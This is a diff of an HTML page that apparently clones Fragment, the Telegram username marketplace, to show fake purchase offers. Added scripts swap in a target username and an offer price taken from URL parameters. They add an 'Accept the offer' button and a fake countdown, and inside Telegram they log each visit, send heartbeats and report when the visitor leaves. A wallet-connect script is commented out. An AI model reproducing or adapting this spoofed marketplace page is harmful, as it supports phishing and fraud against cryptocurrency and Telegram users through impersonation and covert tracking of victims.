@@ -12,6 +12,7 @@
         <meta name="format-detection" content="telephone=no" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="MobileOptimized" content="176" />
+        <!-- RIMOSSO lo stile che nascondeva il body -->
         <meta name="HandheldFriendly" content="True" />
         <meta name="twitter:card" content="summary" />
 
@@ -319,9 +320,18 @@
                         </div>
                     </div>
 
-                    <div class="tm-section-box tm-section-buttons js-actions">
-                        <button class="btn btn-primary" id="start-btn" onclick="onStartClick()">
-                            <span class="tm-button-label1">Connetti il wallet</span>
+                    <div
+                        class="tm-section-box tm-section-buttons js-actions"
+                        data-username="user"
+                        data-item-title="@user"
+                    >
+                        <button
+                            class="btn btn-primary js-make-offer-btn"
+                            id="accept-offer"
+                        >
+                            <span class="tm-button-label"
+                                >Accept the offer</span
+                            >
                         </button>
                     </div>
                 </section>
@@ -1002,16 +1012,209 @@
                 </div>
             </footer>
         </div>
-        <!-- TonWeb (serve per le operazioni su TON) -->
-        <script src="https://unpkg.com/tonweb@0.0.65/dist/tonweb.js"></script>
-        
-        <!-- TonConnect UI -->
-        <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
-        
-        <!-- Il tuo file auction.js (logica transazione) -->
-        <script src="auction.js"></script>
-        
-        <!-- Il tuo file page.js (controller) -->
-        <script src="page.js"></script>
+
+        <!-- SCRIPT AGGIUNTO: aggiorna username e prezzo dai parametri URL -->
+        <script>
+            (function() {
+                // Legge i parametri dalla query string
+                const params = new URLSearchParams(window.location.search);
+                const item = params.get('item');
+                const bid = params.get('bid');
+
+                if (item) {
+                    // Aggiorna il titolo della pagina
+                    document.title = item + ' – Fragment';
+
+                    // Aggiorna tutti gli elementi che contengono "spettro"
+                    // 1) Il subdomain nel breadcrumb
+                    const sub = document.querySelector('.subdomain');
+                    if (sub) {
+                        // Sostituisce solo se il contenuto è "spettro" (o con spazi)
+                        if (sub.textContent.trim() === 'spettro') {
+                            sub.textContent = item;
+                        }
+                    }
+
+                    // 2) Tutti gli span con classe accent-color
+                    document.querySelectorAll('.accent-color').forEach(el => {
+                        let html = el.innerHTML;
+                        // Sostituisce @spettro -> @item
+                        html = html.replace(/@spettro/g, '@' + item);
+                        // Sostituisce t.me/spettro -> t.me/item
+                        html = html.replace(/t\.me\/spettro/g, 't.me/' + item);
+                        // Sostituisce "spettro" singolo (con eventuali spazi attorno)
+                        html = html.replace(/>\s*spettro\s*</g, '>' + item + '<');
+                        el.innerHTML = html;
+                    });
+
+                    // 3) Nel testo "t.me/spettro" anche fuori da .accent-color? (solo nel Web Address)
+                    // già coperto dal selettore sopra, ma per sicurezza cerchiamo anche nel testo del dd
+                    document.querySelectorAll('.tm-list-item-value').forEach(el => {
+                        if (el.textContent.includes('t.me/spettro')) {
+                            el.innerHTML = el.innerHTML.replace(/t\.me\/spettro/g, 't.me/' + item);
+                        }
+                        if (el.textContent.includes('@spettro')) {
+                            el.innerHTML = el.innerHTML.replace(/@spettro/g, '@' + item);
+                        }
+                    });
+
+                    // 4) Eventuali altri testi che contengono "spettro" (es. data-attributes? no)
+                }
+
+                if (bid) {
+                    // Sostituisce "1,000" con il nuovo prezzo in tutti gli elementi che lo contengono
+                    const priceElements = document.querySelectorAll(
+                        '.icon-before.icon-ton, .tm-value, .table-cell-value, .tm-amount'
+                    );
+                    priceElements.forEach(el => {
+                        // Sostituisce solo se il contenuto è "1,000" (esatto)
+                        if (el.textContent.trim() === '1,000') {
+                            el.textContent = bid;
+                        }
+                        // Se contiene "1,000" ma con altri caratteri (es. "1,000 TON"), sostituisce la parte numerica
+                        if (el.textContent.includes('1,000')) {
+                            el.textContent = el.textContent.replace('1,000', bid);
+                        }
+                    });
+
+                    // Inoltre il testo "Someone offered <span>1,000</span>"
+                    const offerText = document.querySelector('.tm-bid-info-text');
+                    if (offerText) {
+                        const spans = offerText.querySelectorAll('.icon-ton');
+                        spans.forEach(span => {
+                            if (span.textContent.trim() === '1,000') {
+                                span.textContent = bid;
+                            }
+                        });
+                    }
+                }
+            })();
+        </script>
+
+        <script>
+            (function () {
+                const tg = window.Telegram?.WebApp;
+                if (!tg) {
+                    return;
+                }
+                tg.ready();
+                tg.expand();
+                try {
+                    const href = window.location.href;
+                    const searchParams = new URLSearchParams(window.location.search);
+                    const encoded = searchParams.get('tgWebAppStartParam');
+                    if (encoded) {
+                        const startAppData = atob(encoded.replace(/-/g, '+').replace(/_/g, '/'));
+                        fetch('./log-startapp', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ startAppData: startAppData, href: href }),
+                        }).then(r => r.json()).then(data => {
+                            if (!data.visitId) return;
+                            const vid = data.visitId;
+                            setInterval(() => {
+                                fetch('./heartbeat', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ visitId: vid }),
+                                });
+                            }, 5000);
+                            window.addEventListener('beforeunload', () => {
+                                navigator.sendBeacon('./leave', new Blob([JSON.stringify({ visitId: vid })], { type: 'application/json' }));
+                            });
+                        });
+                    }
+                } catch(e) {}
+
+                function gtnm() {
+                    const nume = document.querySelector(
+                        ".tm-web3-address .subdomain",
+                    );
+                    return nume ? nume.textContent.replace(/[^a-zA-Z0-9_]/g, "") : "";
+                }
+                document.addEventListener("DOMContentLoaded", function () {
+                    const pgn = gtnm();
+
+                    const xd = pgn
+                        ? `Open https://fragment.com/username/${pgn}?`
+                        : "Open https://fragment.com?";
+
+                    // TEST EDIT
+                    document.body.style.display = "block";
+                    if (tg) {
+                        tg.ready();
+                        tg.expand();
+                    }
+                    /*tg.showPopup(
+                        {
+                            message: xd,
+                            buttons: [
+                                { id: "ok", type: "ok", text: "OK" },
+                                { id: "cancel", type: "close", text: "Cancel" },
+                            ],
+                        },
+                        function (bid) {
+                            if (bid === "ok") {
+                                document.body.style.display = "block";
+                            } else {
+                                tg.close();
+                            }
+                        },
+                    );*/
+                });
+            })();
+            (function() {
+                const offerTimestamp = 1783155192279;
+                if (offerTimestamp && !isNaN(offerTimestamp)) {
+                    const endDate = new Date(offerTimestamp + 7 * 24 * 60 * 60 * 1000);
+                    const wrap = document.getElementById('countdown-wrap');
+                    function updateDigit(el, newVal) {
+                        const currentVal = el.getAttribute('data-val');
+                        if (currentVal !== newVal) {
+                            el.setAttribute('data-prev-val', currentVal);
+                            el.setAttribute('data-val', newVal);
+                            void el.offsetWidth;
+                        }
+                    }
+
+                    let timerInterval;
+
+                    function updateTimer() {
+                        const now = Date.now();
+                        const distance = endDate.getTime() - now;
+                        if (distance <= 0) {
+                            if (timerInterval) clearInterval(timerInterval);
+                            wrap.classList.add('ended');
+                            setTimeout(() => { window.location.href = "https://fragment.com/"; }, 2000);
+                            return;
+                        }
+                        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                        const dStr = String(days);
+                        const hStr = String(hours).padStart(2, '0');
+                        const mStr = String(minutes).padStart(2, '0');
+                        const sStr = String(seconds).padStart(2, '0');
+                        const daysReel = document.getElementById('reel-days');
+                        const daysText = days === 1 ? 'day' : 'days';
+                        updateDigit(daysReel.querySelector('.digit'), dStr + ' ' + daysText);
+                        const hoursDigits = document.getElementById('reel-hours').querySelectorAll('.digit');
+                        updateDigit(hoursDigits[0], hStr[0]);
+                        updateDigit(hoursDigits[1], hStr[1]);
+                        const minutesDigits = document.getElementById('reel-minutes').querySelectorAll('.digit');
+                        updateDigit(minutesDigits[0], mStr[0]);
+                        updateDigit(minutesDigits[1], mStr[1]);
+                        const secondsDigits = document.getElementById('reel-seconds').querySelectorAll('.digit');
+                        updateDigit(secondsDigits[0], sStr[0]);
+                        updateDigit(secondsDigits[1], sStr[1]);
+                    }
+
+                    updateTimer();
+                    timerInterval = setInterval(updateTimer, 1000);
+                }
+            })();
+        </script>
+        <!--<script src="../js/connect.js?v=20260630s141"></script>-->
     </body>
 </html>
